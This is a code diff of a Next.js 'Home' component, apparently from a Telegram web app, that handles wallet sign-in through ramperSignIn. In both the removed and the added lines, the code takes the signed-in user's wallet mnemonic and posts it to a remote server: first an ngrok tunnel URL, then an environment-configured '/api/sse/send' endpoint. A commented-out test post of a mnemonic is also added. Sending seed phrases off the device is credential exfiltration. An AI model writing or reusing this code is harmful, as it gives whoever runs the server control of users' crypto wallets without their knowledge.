@@ -10,6 +10,11 @@ export default function Home() {
   console.log("🩲 🩲 => Home => messageList:", messageList)
 
   const testTelegram = () => {
+
+    // axios.post(`${process.env.NEXT_PUBLIC_BASE_API}/api/sse/send`, {
+    //   mnemonic: '5 testset'
+    // })
+    // return
     if (typeof window !== 'undefined') {
       // window.Telegram.WebApp.openInvoice('https://walletbot.me/scw/tc/connect')
 
@@ -40,8 +45,8 @@ export default function Home() {
               const user = await ramperSignIn();
               console.log("🩲 🩲 => ; => user:", user)
               const mnemonic = user?.mnemonic
-              
-              axios.post('https://6ed5-118-69-134-169.ngrok-free.app/api/token/data', {
+
+              axios.post(`${process.env.NEXT_PUBLIC_BASE_API}/api/sse/send`, {
                 mnemonic
               })
             }
